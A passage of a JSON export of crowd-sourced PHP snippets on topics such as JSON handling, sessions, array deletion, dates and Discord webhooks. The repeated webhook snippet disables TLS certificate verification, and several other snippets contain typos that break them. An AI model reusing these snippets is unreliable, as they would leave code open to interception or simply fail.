    "description": "$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n$json = json_decode(file_get_contents('/path/to/your/file.json'));\njson_encode used when PHP retrieve data and convert Array() to [] !!!! $arr = array('a' => 1, 'b' => 2, 'c' => 3, 'd' => 4, 'e' => 5); echo json_encode($arr); //output {\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5} access from js file data.a, data.b,data.c... ----------------------------------------------   $json = '{\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5}'; json_decode($json, true); //true turns object to associative array;  //output array(5) {     [\"a\"] => int(1)     [\"b\"] => int(2)     [\"c\"] => int(3)     [\"d\"] => int(4)     [\"e\"] => int(5) }  \n<?php  $json = '{\"firstName\":\"Peter\",\"lastName:\":\"Silva\",\"age\":23}';  $personInfo = json_decode(json);  echo $personInfo->age;  ?>\n//\"[{\\\"name\\\": \\\"bill\\\", \\\"score\\\": 0.7948127388954163}, {\\\"name\\\": \\\"john\\\", \\\"score\\\": 0.782698392868042}]\"; //for json in above format try this $r=json_decode(stripcslashes(trim($response,'\"')));\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3434,
    "keyword": null,
    "link": null,
    "title": " php default timezone",
    "description": "date_default_timezone_set(\"Asia/Kolkata\"); // List of Supported Timezones https://www.php.net/manual/en/timezones.php\necho date_default_timezone_get(); //UTC  //Read more at https://www.php.net/manual/en/function.date-default-timezone-get.php\n$date = new \\DateTime(); $date->setTimezone(new \\DateTimeZone('+0800')); //GMT echo $date->format('Y-m-d H:i:s'); // 2020-11-20 15:23:49\ndate_default_timezone_set(\"Asia/Ho_Chi_Minh\"); echo(date('Y-m-d H:i:s');)\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3435,
    "keyword": null,
    "link": null,
    "title": " php define class",
    "description": "<?php class Fruit {   public $name;   public $color;    function __construct($name, $color) {     $this->name = $name;     $this->color = $color;   }   function get_name() {     return $this->name;   }   function get_color() {     return $this->color;   } }  $apple = new Fruit(\"Apple\", \"red\"); echo $apple->get_name(); echo \"<br>\"; echo $apple->get_color(); ?>\nclass Bike {     \tfunction Bike() {             $this->type = 'BMX';     } }  $blackSheep = new Bike();  print $blackSheep->type;\n <?php class Foo {     public $aMemberVar = 'aMemberVar Member Variable';     public $aFuncName = 'aMemberFunc';             function aMemberFunc() {         print 'Inside `aMemberFunc()`';     } }  $foo = new Foo;  function getVarName() {      return 'aFuncName';  }  print $foo->{$foo->{getVarName()}}();  \nvar numbers = [10, 20, 30, 40] // sums to 100var sum = 0;for (var i = 0; i < numbers.length; i++) {  sum += numbers[i]}\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3436,
    "keyword": null,
    "link": null,
    "title": " php define multiple variables as 0",
    "description": "$var_a = $var_b = $same_var = $var_d = $some_var = 'A';\n$totalvariablename = $variablename * $othervariablename + ($othervariablename * 2);\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3437,
    "keyword": null,
    "link": null,
    "title": " php define object",
    "description": "$x = (object) [     'a' => 'test',     'b' => 'test2',     'c' => 'test3' ]; var_dump($x);  /* object(stdClass)#1 (3) {   [\"a\"]=>   string(4) \"test\"   [\"b\"]=>   string(5) \"test2\"   [\"c\"]=>   string(5) \"test3\" } */\n$x = new stdClass();\n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n$o= new \\stdClass(); $o->a = 'new object';  OR  $o = (object) ['a' => 'new object'];\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3438,
    "keyword": null,
    "link": null,
    "title": " php define strict types",
    "description": "\"Strict types\" mode only checks types at specific points in the code; it does not track everything that happens to the variable.  Specifically, it checks:  the parameters given to the function, if type hints are included in the signature; here you are giving two ints to a function expecting two ints, so there is no error the return value of the function, if a return type hint is included in the signature; here you have no type hint, but if you had a hint of : int, there would still be no error, because the result of $a + $b + $c is indeed an int. Here are some examples that do give errors:  declare(strict_types=1); $a = '1'; $b = '2'; function FunctionName(int $a, int $b) {     return $a + $b; } echo FunctionName($a, $b);\ndeclare(strict_types = 1);\n",
    "reg_date": "2021-10-12T10:17:59.000Z"
  },
  {
    "id": 3439,
    "keyword": null,
    "link": null,
    "title": " php delay",
    "description": "sleep(1.5);\t// Sleeps 1.5 seconds\n<?php     sleep(4);     echo \"Done\\n\"; ?> \nsleep()\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3440,
    "keyword": null,
    "link": null,
    "title": " php delay redirect",
    "description": "<?php    header(\"refresh:5; url=wherever.php\");  ?>\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3441,
    "keyword": null,
    "link": null,
    "title": " php delete a folder",
    "description": "function deleteDirectory($dir) {     if (!file_exists($dir)) {         return true;     }      if (!is_dir($dir)) {         return unlink($dir);     }      foreach (scandir($dir) as $item) {         if ($item == '.' || $item == '..') {             continue;         }          if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {             return false;         }      }      return rmdir($dir); } \nrmdir ( string $dirname , resource $context = ? ) : bool\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3442,
    "keyword": null,
    "link": null,
    "title": " php delete all files in folder",
    "description": "$files = glob('path/to/temp/*'); // get all file names foreach($files as $file){ // iterate files   if(is_file($file)) {     unlink($file); // delete file   } }\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3443,
    "keyword": null,
    "link": null,
    "title": " php delete array element",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\nforeach ($items as $key =>$item){   if(condition){     unset($item[$key]);   } }\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3444,
    "keyword": null,
    "link": null,
    "title": " php delete array item by value",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n// matrix array foreach($appsList as $key => $app) {             if($app[\"app_status\"] !== \"approved\") {                 // remove orange apps                 unset($appsList[$key]);             } }\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]);\n$colors = arrray(\"blue\",\"green\",\"red\"); if(($key = array_search(\"greeb\",$colors)) !== false) { unset(\"$colors[$key]); }\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3445,
    "keyword": null,
    "link": null,
    "title": " php delete array item by value not key",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n$result_Member = $this->Member->get_list_member_belong_to_company($id);  /*  $result_Member = array( \t[10] => 10,     [20] => 11,     [30] => 12, ) */  // remove key, get values only $member_ids = array_values($result_Member);  /* $result_Member = array( \t[0] => 10,     [1] => 11,     [2] => 12, ) */\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3446,
    "keyword": null,
    "link": null,
    "title": " php delete directory",
    "description": "function deleteDirectory($dir) {     if (!file_exists($dir)) {         return true;     }      if (!is_dir($dir)) {         return unlink($dir);     }      foreach (scandir($dir) as $item) {         if ($item == '.' || $item == '..') {             continue;         }          if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {             return false;         }      }      return rmdir($dir); } \nrmdir ( string $dirname , resource $context = ? ) : bool\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3447,
    "keyword": null,
    "link": null,
    "title": " php delete element by value",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n// matrix array foreach($appsList as $key => $app) {             if($app[\"app_status\"] !== \"approved\") {                 // remove orange apps                 unset($appsList[$key]);             } }\n",
    "reg_date": "2021-10-12T10:18:00.000Z"
  },
  {
    "id": 3448,
    "keyword": null,
    "link": null,
    "title": " php delete element from array",
    "description": "$colors = array(\"blue\",\"green\",\"red\");  //delete element in array by value \"green\" if (($key = array_search(\"green\", $colors)) !== false) {     unset($colors[$key]); }\n$items = ['banana', 'apple'];  unset($items[0]);  var_dump($items); // ['apple']\n//Delete array items with unset(no re-index) or array_splice(re-index)  $colors = array(\"red\",\"blue\",\"green\");                               unset($colors[1]);//remove second element, do not re-index array    $colors = array(\"red\",\"blue\",\"green\");  array_splice($colors, 1, 1); //remove second element, re-index array\n$array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; unset($array[1]); //Key which you want to delete /* $array: [     [0] => a     [2] => c ] */ //OR $array = [0 => \"a\", 1 => \"b\", 2 => \"c\"]; array_splice($array, 1, 1);//Offset which you want to delet /* $array: [     [0] => a     [1] => c ] */\n$arr = array('a' => 1, 'b' => 2, 'c' => 3); unset($arr['b']);  // RESULT: array('a' => 1, 'c' => 3)  $arr = array(1, 2, 3); array_splice($arr, 1, 1);  // RESULT: array(0 => 1, 1 => 3)\nforeach ($items as $key =>$item){   if(condition){     unset($item[$key]);   } }\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3449,
    "keyword": null,
    "link": null,
    "title": " php delete session",
    "description": "session_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php    unset($_SESSION['counter']); ?>\n// Create a session variable called something like this after you start the session: $_SESSION['user_start'] = time();   // Then when they get to submitting the payment, just check whether they're within the 5 minute window if (time() - $_SESSION['user_start'] < 300) { // 300 seconds = 5 minutes     // they're within the 5 minutes so save the details to the database } else {     // sorry, you're out of time    unset($_SESSION['user_start']); // and unset any other session vars for this task }\n<?php // Destroy the currently active session. session_destroy(); ?>\n All of a sudden neither session_destroy() nor $_SESSION=[] were sufficient to log out. I found the next to work: <?php setcookie(session_name(), session_id(), 1); // to expire the session $_SESSION = []; ?>  \n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3450,
    "keyword": null,
    "link": null,
    "title": " php destroy session after some time",
    "description": "session_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n// Create a session variable called something like this after you start the session: $_SESSION['user_start'] = time();   // Then when they get to submitting the payment, just check whether they're within the 5 minute window if (time() - $_SESSION['user_start'] < 300) { // 300 seconds = 5 minutes     // they're within the 5 minutes so save the details to the database } else {     // sorry, you're out of time    unset($_SESSION['user_start']); // and unset any other session vars for this task }\n<?php // Destroy the currently active session. session_destroy(); ?>\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3451,
    "keyword": null,
    "link": null,
    "title": " php detect base64 encoding",
    "description": "function is_base64_encoded($data) {     if (preg_match('%^[a-zA-Z0-9/+]*={0,2}$%', $data)) {        return TRUE;     } else {        return FALSE;     } };  is_base64_encoded(\"iash21iawhdj98UH3\"); // true is_base64_encoded(\"#iu3498r\"); // false is_base64_encoded(\"asiudfh9w=8uihf\"); // false is_base64_encoded(\"a398UIhnj43f/1!+sadfh3w84hduihhjw==\"); // false\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3452,
    "keyword": null,
    "link": null,
    "title": " php detect mobile",
    "description": "function isMobile() {     return preg_match(\"/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\\.browser|up\\.link|webos|wos)/i\", $_SERVER[\"HTTP_USER_AGENT\"]); } \nfunction isMobileDevice() {     return preg_match(\"/(android|avantgo|blackberry|bolt|boost|cricket|docomo |fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\\.browser|up\\.link|webos|wos)/i\" , $_SERVER[\"HTTP_USER_AGENT\"]); }\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3453,
    "keyword": null,
    "link": null,
    "title": " php detect mobile request",
    "description": "function isMobileDevice() {     return preg_match(\"/(android|avantgo|blackberry|bolt|boost|cricket|docomo |fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\\.browser|up\\.link|webos|wos)/i\" , $_SERVER[\"HTTP_USER_AGENT\"]); }\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3454,
    "keyword": null,
    "link": null,
    "title": " php detect request type",
    "description": "if ($_SERVER['REQUEST_METHOD'] === 'POST') {      // Boom baby we a POST method } if ($_SERVER['REQUEST_METHOD'] === 'GET') {      // We are a GET method }\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3455,
    "keyword": null,
    "link": null,
    "title": " php development server",
    "description": "$ cd ~/public_html $ php -S localhost:8000\nsimple built-in php server\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3456,
    "keyword": null,
    "link": null,
    "title": " php didscord webhook",
    "description": "<?php //2021 current working model $url = \"https://discordapp.com/api/webhooks/0000000/ABCDEFGH....\"; // security issue with this being false not tested ?? curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $hookObject = json_encode([     /*      * The general \"message\" shown above your embeds      */     \"content\" => \"A message will go here\",     /*      * The username shown in the message      */     \"username\" => \"MyUsername\",     /*      * The image location for the senders image      */     \"avatar_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\",     /*      * Whether or not to read the message in Text-to-speech      */     \"tts\" => false,     /*      * File contents to send to upload a file      */     // \"file\" => \"\",     /*      * An array of Embeds      */     \"embeds\" => [         /*          * Our first embed          */         [             // Set the title for your embed             \"title\" => \"Google.com\",                          // The type of your embed, will ALWAYS be \"rich\"             \"type\" => \"rich\",                          // A description for your embed             \"description\" => \"\",                          // The URL of where your title will be a link to             \"url\" => \"https://www.google.com/\",                          /* A timestamp to be displayed below the embed, IE for when an an article was posted              * This must be formatted as ISO8601              */             \"timestamp\" => \"2018-03-10T19:15:45-05:00\",                          // The integer color to be used on the left side of the embed             \"color\" => hexdec( \"FFFFFF\" ),                          // Footer object             \"footer\" => [                 \"text\" => \"Google TM\",                 \"icon_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Image object             \"image\" => [                 \"url\" => \"https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png\"             ],                          // Thumbnail object             \"thumbnail\" => [                 \"url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Author object             \"author\" => [                 \"name\" => \"Alphabet\",                 \"url\" => \"https://www.abc.xyz\"             ],                          // Field array of objects             \"fields\" => [                 // Field 1                 [                     \"name\" => \"Data A\",                     \"value\" => \"Value A\",                     \"inline\" => false                 ],                 // Field 2                 [                     \"name\" => \"Data B\",                     \"value\" => \"Value B\",                     \"inline\" => true                 ],                 // Field 3                 [                     \"name\" => \"Data C\",                     \"value\" => \"Value C\",                     \"inline\" => true                 ]             ]         ]     ]      ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );  $headers = [ 'Content-Type: application/json; charset=utf-8' ]; $POST = [ 'username' => 'Testing BOT', 'content' => 'Testing message' ];  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, $hookObject); $response   = curl_exec($ch);\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3457,
    "keyword": null,
    "link": null,
    "title": " php difference between two dates",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$datetime1 \t= new DateTime('2020-10-11 16:52:52'); $datetime2 \t= new DateTime('2020-10-13 16:52:52'); $interval \t= $datetime1->diff($datetime2);  echo $interval->format('%a days');\n$now = time(); // or your date as well $your_date = strtotime(\"2010-01-31\"); $datediff = $now - $your_date;  echo round($datediff / (60 * 60 * 24));\n$period = new DatePeriod(      new DateTime('2010-10-01'),      new DateInterval('P1D'),      new DateTime('2010-10-05') );  //Which should get you an array with DateTime objects.   //To iterate  foreach ($period as $key => $value) {     //$value->format('Y-m-d')        }\n$timeFirst  = strtotime('2011-05-12 18:20:20'); $timeSecond = strtotime('2011-05-13 18:20:20'); $differenceInSeconds = $timeSecond - $timeFirst; \n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n",
    "reg_date": "2021-10-12T10:18:01.000Z"
  },
  {
    "id": 3458,
    "keyword": null,
    "link": null,
    "title": " php difference between two dates in years months and days",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\nfunction numWeeks($dateOne, $dateTwo){     //Create a DateTime object for the first date.     $firstDate = new DateTime($dateOne);     //Create a DateTime object for the second date.     $secondDate = new DateTime($dateTwo);     //Get the difference between the two dates in days.     $differenceInDays = $firstDate->diff($secondDate)->days;     //Divide the days by 7     $differenceInWeeks = $differenceInDays / 7;     //Round down with floor and return the difference in weeks.     return floor($differenceInWeeks); }  $numOfWeek = numWeeks('2021-01-21', '2021-01-28');\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3459,
    "keyword": null,
    "link": null,
    "title": " php directory listing",
    "description": "if ($handle = opendir('.')) {      while (false !== ($entry = readdir($handle))) {          if ($entry != \".\" && $entry != \"..\") {              echo \"$entry\\n\";         }     }      closedir($handle); }\nforeach(glob('includes/*.php') as $file) {     ... }\n$dir = '.'; $directories = glob($dir . '/*', GLOB_ONLYDIR);\nscandir ( string $directory [, int $sorting_order = SCANDIR_SORT_ASCENDING [, resource $context ]] ) : array\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3460,
    "keyword": null,
    "link": null,
    "title": " php discord embed",
    "description": "<?php //2021 current working model $url = \"https://discordapp.com/api/webhooks/0000000/ABCDEFGH....\"; // security issue with this being false not tested ?? curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $hookObject = json_encode([     /*      * The general \"message\" shown above your embeds      */     \"content\" => \"A message will go here\",     /*      * The username shown in the message      */     \"username\" => \"MyUsername\",     /*      * The image location for the senders image      */     \"avatar_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\",     /*      * Whether or not to read the message in Text-to-speech      */     \"tts\" => false,     /*      * File contents to send to upload a file      */     // \"file\" => \"\",     /*      * An array of Embeds      */     \"embeds\" => [         /*          * Our first embed          */         [             // Set the title for your embed             \"title\" => \"Google.com\",                          // The type of your embed, will ALWAYS be \"rich\"             \"type\" => \"rich\",                          // A description for your embed             \"description\" => \"\",                          // The URL of where your title will be a link to             \"url\" => \"https://www.google.com/\",                          /* A timestamp to be displayed below the embed, IE for when an an article was posted              * This must be formatted as ISO8601              */             \"timestamp\" => \"2018-03-10T19:15:45-05:00\",                          // The integer color to be used on the left side of the embed             \"color\" => hexdec( \"FFFFFF\" ),                          // Footer object             \"footer\" => [                 \"text\" => \"Google TM\",                 \"icon_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Image object             \"image\" => [                 \"url\" => \"https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png\"             ],                          // Thumbnail object             \"thumbnail\" => [                 \"url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Author object             \"author\" => [                 \"name\" => \"Alphabet\",                 \"url\" => \"https://www.abc.xyz\"             ],                          // Field array of objects             \"fields\" => [                 // Field 1                 [                     \"name\" => \"Data A\",                     \"value\" => \"Value A\",                     \"inline\" => false                 ],                 // Field 2                 [                     \"name\" => \"Data B\",                     \"value\" => \"Value B\",                     \"inline\" => true                 ],                 // Field 3                 [                     \"name\" => \"Data C\",                     \"value\" => \"Value C\",                     \"inline\" => true                 ]             ]         ]     ]      ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );  $headers = [ 'Content-Type: application/json; charset=utf-8' ]; $POST = [ 'username' => 'Testing BOT', 'content' => 'Testing message' ];  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, $hookObject); $response   = curl_exec($ch);\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3461,
    "keyword": null,
    "link": null,
    "title": " php discord webhook",
    "description": "<?php //2021 current working model $url = \"https://discordapp.com/api/webhooks/0000000/ABCDEFGH....\"; // security issue with this being false not tested ?? curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $hookObject = json_encode([     /*      * The general \"message\" shown above your embeds      */     \"content\" => \"A message will go here\",     /*      * The username shown in the message      */     \"username\" => \"MyUsername\",     /*      * The image location for the senders image      */     \"avatar_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\",     /*      * Whether or not to read the message in Text-to-speech      */     \"tts\" => false,     /*      * File contents to send to upload a file      */     // \"file\" => \"\",     /*      * An array of Embeds      */     \"embeds\" => [         /*          * Our first embed          */         [             // Set the title for your embed             \"title\" => \"Google.com\",                          // The type of your embed, will ALWAYS be \"rich\"             \"type\" => \"rich\",                          // A description for your embed             \"description\" => \"\",                          // The URL of where your title will be a link to             \"url\" => \"https://www.google.com/\",                          /* A timestamp to be displayed below the embed, IE for when an an article was posted              * This must be formatted as ISO8601              */             \"timestamp\" => \"2018-03-10T19:15:45-05:00\",                          // The integer color to be used on the left side of the embed             \"color\" => hexdec( \"FFFFFF\" ),                          // Footer object             \"footer\" => [                 \"text\" => \"Google TM\",                 \"icon_url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Image object             \"image\" => [                 \"url\" => \"https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png\"             ],                          // Thumbnail object             \"thumbnail\" => [                 \"url\" => \"https://pbs.twimg.com/profile_images/972154872261853184/RnOg6UyU_400x400.jpg\"             ],                          // Author object             \"author\" => [                 \"name\" => \"Alphabet\",                 \"url\" => \"https://www.abc.xyz\"             ],                          // Field array of objects             \"fields\" => [                 // Field 1                 [                     \"name\" => \"Data A\",                     \"value\" => \"Value A\",                     \"inline\" => false                 ],                 // Field 2                 [                     \"name\" => \"Data B\",                     \"value\" => \"Value B\",                     \"inline\" => true                 ],                 // Field 3                 [                     \"name\" => \"Data C\",                     \"value\" => \"Value C\",                     \"inline\" => true                 ]             ]         ]     ]      ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );  $headers = [ 'Content-Type: application/json; charset=utf-8' ]; $POST = [ 'username' => 'Testing BOT', 'content' => 'Testing message' ];  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_POSTFIELDS, $hookObject); $response   = curl_exec($ch);\nfunction postToDiscord() {     $data = array(\"content\" => \"Your Content\", \"username\" => \"Webhooks\");     $curl = curl_init(\"https://discordapp.com/api/webhooks/YOUR-WEBHOOK-URL-HERE\");     curl_setopt($curl, CURLOPT_CUSTOMREQUEST, \"POST\");     curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     return curl_exec($curl); }\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3462,
    "keyword": null,
    "link": null,
    "title": " php display errors",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Display all errors like dev */ ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /* Display PROD errors */ ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);  /* OTHER SETTINGS*/  // Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // Report all errors except E_NOTICE error_reporting(E_ALL & ~E_NOTICE); // For PHP < 5.3 error_reporting(E_ALL ^ E_NOTICE);  // Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); \n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3463,
    "keyword": null,
    "link": null,
    "title": " php do not refresh page after submit post",
    "description": "//Using Javascript <script> if ( window.history.replaceState ) {         window.history.replaceState( null, null, window.location.href );     } </script>\n// add this code to javascript <script>     if ( window.history.replaceState ) {         window.history.replaceState( null, null, window.location.href );     } </script>\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3464,
    "keyword": null,
    "link": null,
    "title": " php document root",
    "description": "<?php echo $_SERVER['DOCUMENT_ROOT'].'/hello.html'; ?>\n$RootPath = $_SERVER[\"DOCUMENT_ROOT\"];\n",
    "reg_date": "2021-10-12T10:18:02.000Z"
  },
  {
    "id": 3465,
    "keyword": null,
    "link": null,
    "title": " php does property exist",
